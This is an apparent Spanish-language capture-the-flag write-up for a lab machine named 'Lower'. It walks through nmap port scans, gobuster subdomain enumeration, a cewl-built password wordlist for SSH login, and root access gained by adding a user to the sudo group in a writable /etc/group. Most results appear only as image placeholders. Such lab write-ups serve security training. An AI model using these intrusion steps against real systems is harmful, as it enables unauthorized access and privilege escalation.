# Máquina Lower

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 192.168.42.140

![alt text](image-1.png)


### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 vvv -Pn 192.168.42.140

![alt text](image-2.png)

agregamos al /etc/hosts el dominio unique.nyx

![alt text](image-3.png)

### Fuzing web

al intentar ingresar al unique.nyx no me sale nada de información entonces procedí a enumerar subdominios:

gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://unique.nyx --append-domain

![alt text](image-4.png)

entonces lo agregamos al /etc/hosts

![alt text](image-5.png)

ingresamos por url:

http://tech.unique.nyx/


![alt text](image-6.png)

### Explotación

Tomé los nombres de tom, kathren y lancer y los guardo como usernames.txt

luego genero un diccionario con la herramienta cewl con las palabras que hay en la web

cewl http://tech.unique.nyx/ --with-numbers -w pass.txt

![alt text](image-7.png)

Me conecté por ssh:

![alt text](image-8.png)

### user.txt

![alt text](image-9.png)


### Escalar privilegios

Ejecuté linpeas y me aparece que tengo permisos de escritura en /etc/group

entonces edité el archivo:

nano /etc/group

sudo:x:27:lancer

cerré sesión y volví a conectarme por ssh

hice id 

![alt text](image-10.png)

hice sudo su y escribí la contraseña de lancer

![alt text](image-11.png)

### root.txt

![alt text](image-12.png)